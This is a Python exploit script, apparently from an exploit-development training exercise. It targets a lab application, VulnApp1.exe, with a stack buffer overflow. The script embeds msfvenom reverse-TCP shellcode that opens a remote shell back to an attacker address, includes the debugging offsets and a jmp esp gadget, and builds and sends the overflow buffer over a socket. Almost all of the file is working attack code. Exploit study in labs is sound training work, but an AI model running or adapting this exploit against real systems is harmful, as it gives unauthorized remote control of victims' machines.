#!/usr/bin/env python3

# 3.4.9.2 Extra Mile - VulnApp1.exe [b6cd583811d55e04ce05054a2971b280]
# Date: 20250202
# Exploit Author: Artur [ajes] Szymczak
# Tested on: Windows 10 EN x86 - build: 10.0.16299

import socket
import struct

# target
host = "192.168.1.211"
port = 7001

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=443 EXITFUNC=thread -f python -v shellcode -e x86/shikata_ga_nai -b "\x00"
shellcode =  b""
shellcode += b"\xd9\xeb\xbe\xbb\xaa\x35\x97\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x72\x17\x03\x72\x17"
shellcode += b"\x83\x51\x56\xd7\x62\x59\x4f\x9a\x8d\xa1\x90"
shellcode += b"\xfb\x04\x44\xa1\x3b\x72\x0d\x92\x8b\xf0\x43"
shellcode += b"\x1f\x67\x54\x77\x94\x05\x71\x78\x1d\xa3\xa7"
shellcode += b"\xb7\x9e\x98\x94\xd6\x1c\xe3\xc8\x38\x1c\x2c"
shellcode += b"\x1d\x39\x59\x51\xec\x6b\x32\x1d\x43\x9b\x37"
shellcode += b"\x6b\x58\x10\x0b\x7d\xd8\xc5\xdc\x7c\xc9\x58"
shellcode += b"\x56\x27\xc9\x5b\xbb\x53\x40\x43\xd8\x5e\x1a"
shellcode += b"\xf8\x2a\x14\x9d\x28\x63\xd5\x32\x15\x4b\x24"
shellcode += b"\x4a\x52\x6c\xd7\x39\xaa\x8e\x6a\x3a\x69\xec"
shellcode += b"\xb0\xcf\x69\x56\x32\x77\x55\x66\x97\xee\x1e"
shellcode += b"\x64\x5c\x64\x78\x69\x63\xa9\xf3\x95\xe8\x4c"
shellcode += b"\xd3\x1f\xaa\x6a\xf7\x44\x68\x12\xae\x20\xdf"
shellcode += b"\x2b\xb0\x8a\x80\x89\xbb\x27\xd4\xa3\xe6\x2f"
shellcode += b"\x19\x8e\x18\xb0\x35\x99\x6b\x82\x9a\x31\xe3"
shellcode += b"\xae\x53\x9c\xf4\xd1\x49\x58\x6a\x2c\x72\x99"
shellcode += b"\xa3\xeb\x26\xc9\xdb\xda\x46\x82\x1b\xe2\x92"
shellcode += b"\x05\x4b\x4c\x4d\xe6\x3b\x2c\x3d\x8e\x51\xa3"
shellcode += b"\x62\xae\x5a\x69\x0b\x45\xa1\xfa\xf4\x32\xa8"
shellcode += b"\xea\x9c\x40\xaa\x0b\xe6\xcc\x4c\x61\x08\x99"
shellcode += b"\xc7\x1e\xb1\x80\x93\xbf\x3e\x1f\xde\x80\xb5"
shellcode += b"\xac\x1f\x4e\x3e\xd8\x33\x27\xce\x97\x69\xee"
shellcode += b"\xd1\x0d\x05\x6c\x43\xca\xd5\xfb\x78\x45\x82"
shellcode += b"\xac\x4f\x9c\x46\x41\xe9\x36\x74\x98\x6f\x70"
shellcode += b"\x3c\x47\x4c\x7f\xbd\x0a\xe8\x5b\xad\xd2\xf1"
shellcode += b"\xe7\x99\x8a\xa7\xb1\x77\x6d\x1e\x70\x21\x27"
shellcode += b"\xcd\xda\xa5\xbe\x3d\xdd\xb3\xbe\x6b\xab\x5b"
shellcode += b"\x0e\xc2\xea\x64\xbf\x82\xfa\x1d\xdd\x32\x04"
shellcode += b"\xf4\x65\x52\xe7\xdc\x93\xfb\xbe\xb5\x19\x66"
shellcode += b"\x41\x60\x5d\x9f\xc2\x80\x1e\x64\xda\xe1\x1b"
shellcode += b"\x20\x5c\x1a\x56\x39\x09\x1c\xc5\x3a\x18"

# info from debugging:
## offsets:
### ebx: 2252
### ecx: 2268
### edx: 2256
### esi: 2264
### edi: 2260
### eip: 2288

## gadgets:
### 0:001> s 14800000 14816000 0xff 0xe4
### 148010cf  ff e4 83 7d f8 00 75 03-58 5b c3 5b 8b e5 5d c3  ...}..u.X[.[..].
### 0:001> u 148010cf  
### VulnApp1+0x10cf:
### 148010cf ffe4            jmp     esp


# payload:
nops        = b"\x90" * (2288-len(shellcode))
eip         = struct.pack("<I", 0x148010cf)
jmp         = b"\x81\xC4\x20\xFE\xFF\xFF" + b"\xFF\xE4" # ADD ESP,-480; JMP ESP
offset1     = b"C" * 8
offset2     = b"D" * (260-len(jmp))
payload     = nops + shellcode + eip + offset1 + jmp + offset2

###
# buffer:
buffer = payload
try:
    print("\nSending evil buffer...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(buffer)
    s.close()
  
    print("\nDone!")
  
except socket.error:
    print("\nCould not connect!")

